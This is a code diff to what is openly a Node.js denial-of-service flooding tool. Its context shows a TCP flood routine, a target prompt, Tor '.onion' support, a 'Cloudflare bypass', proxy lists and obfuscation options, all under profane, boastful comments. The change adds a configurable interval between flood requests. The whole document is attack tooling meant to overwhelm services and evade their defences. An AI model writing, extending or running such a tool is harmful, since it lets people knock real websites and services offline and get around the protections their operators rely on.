@@ -19,6 +19,7 @@ const dns = require('dns').promises;
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const fs = require('fs'); // File system module for logging
 const { fetch } = require('cross-fetch'); // Cross-browser fetch
+const stream = require('stream');
 
 // Configuration - Let's fuck things up HARD!
 let targetURL;
@@ -35,6 +36,7 @@ let useRandomSubdomains;
 let advancedObfuscation;
 let autoAdjustThreads;
 let customPayload;
+let requestInterval = 0; // Interval between requests in milliseconds
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -390,7 +392,7 @@ async function tcpFlood(threadId) {
                     clearInterval(intervalId);
                     socket.destroy();
                 }
-            }, 0);
+            }, requestInterval);
 
             socket.on('error', (err) => {
                 log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
@@ -573,6 +575,14 @@ function askForDetails() {
             return;
         }
 
+         requestInterval = parseInt(prompt(`${purple}Enter request interval in milliseconds (0 for max speed):${resetColor}`));
+        if (isNaN(requestInterval)) {
+            alert(`${darkRed}Invalid request interval! Use a number, moron!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
         onionSupport = confirm(`${darkPurple}Enable .onion support? Requires Tor proxy. Don't be a retard if you don't know what this is:${resetColor}`);
         cloudflareBypass = confirm(`${darkPurple}Attempt Cloudflare bypass? (May not always work, you dumbass!) Using advanced techniques. Better have good proxies!${resetColor}`);
         proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip (not recommended for Cloudflare bypass):${resetColor}`);
@@ -593,7 +603,8 @@ function askForDetails() {
             useRandomSubdomains,
             advancedObfuscation,
             autoAdjustThreads,
-            customPayload
+            customPayload,
+            requestInterval
         });
     });
 }
@@ -622,7 +633,8 @@ async function main() {
         useRandomSubdomains,
         advancedObfuscation,
         autoAdjustThreads,
-        customPayload
+        customPayload,
+        requestInterval
     } = details);
 
     const resolvedIPs = await resolveHostname(targetHost);
